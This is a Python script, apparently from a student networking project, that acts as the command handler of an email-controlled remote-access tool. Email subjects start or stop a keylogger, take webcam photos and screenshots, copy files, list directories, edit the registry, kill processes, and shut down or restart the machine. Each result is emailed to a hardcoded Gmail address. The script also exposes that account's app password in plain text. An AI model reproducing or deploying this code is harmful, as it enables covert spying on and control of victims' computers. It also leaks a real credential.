from re import sub
import ReceiveEmail
import SendEmail
import ListProcesses
import KeyLogger
from time import time, sleep
import WebcamCapture
import Registry
import ListDir
import Restart
import Shutdown
import ScreenCapture
import KillProcess
import Help

client_address = "client1.computernetwork@gmail.com"


client_pass="w l s v j i q z b a y i w k u y" #unsecure


# guess_address = "lmtri.fit.hcmus@gmail.com"
guess_address = "letrong2307@gmail.com"
thread = None
def Handling(subject):
    global thread
    if subject == 'LIST PROCESSES':
        content = ListProcesses.ListProcesses()
        SendEmail.SendEmail(content,client_address,client_pass,guess_address,subject,'text')
    elif subject == "WEBCAM CAPTURE":
        content = WebcamCapture.WebcamCapture()
        SendEmail.SendEmail(content,client_address,client_pass,guess_address,subject,'image')
    elif subject == "START KEY LOGGING":
        thread = KeyLogger.StartLogging()
        content = "KEY LOGGING HAS BEEN LAUNCHED"
        SendEmail.SendEmail(content,client_address,client_pass,guess_address,subject,'text')
    elif subject == "END KEY LOGGING":
        content =   KeyLogger.EndLogging(thread)
        SendEmail.SendEmail(content,client_address,client_pass,guess_address,subject,'text')
    elif subject[0] == "COPY FILE":
        content = subject[1]
        SendEmail.SendEmail(content,client_address,client_pass,guess_address,subject,'file')
    elif subject[0] == "LIST DIR":
        content = ListDir.listDir(subject[1])
        SendEmail.SendEmail(content,client_address,client_pass,guess_address,subject,'text')
    elif subject[0] =="REGISTRY":
        content =  Registry.Registry(subject[1], subject[2], subject[3], subject[4], subject[5])
        SendEmail.SendEmail(content,client_address,client_pass,guess_address,subject,'text')
    elif subject == "SCREEN CAPTURE":
        content = ScreenCapture.ScreenCapture()
        SendEmail.SendEmail(content,client_address,client_pass,guess_address,subject,'image')
    elif subject == 'SHUTDOWN':
        content = Shutdown.Shutdown()
        SendEmail.SendEmail(content,client_address,client_pass,guess_address,subject,'text')
    elif subject == 'RESTART':
        content = Restart.Restart()
        SendEmail.SendEmail(content,client_address,client_pass,guess_address,subject,'text')
    elif subject[:12] == 'KILL PROCESS':
        content = KillProcess.KillProcess(subject[15:])
        SendEmail.SendEmail(content,client_address,client_pass,guess_address,subject,'text')
    elif subject == 'HELP':
        content = Help.Help()
        SendEmail.SendEmail(content,client_address,client_pass,guess_address,subject,'text')
    else:
        print("Can't run!")
        
def run(list_sub, detail_litst):
    # while True:
        # Nhận danh sách title của các thư "CHƯA ĐỌC"
    # global list_sub
    # global detail_list
    # list_sub, detail_list = ReceiveEmail.ReceiveEmail(client_address,client_pass)
    if len(list_sub):
        for i in list_sub:
            #Xử lý các title tương ứng
            Handling(i)
    # sleep(5)
        # else:
        #     print("Không có thư nào chưa đọc")
        # break
        # Handling("demo send picture")
        # break


#======================================================

# if __name__ == "__main__":
#     run()
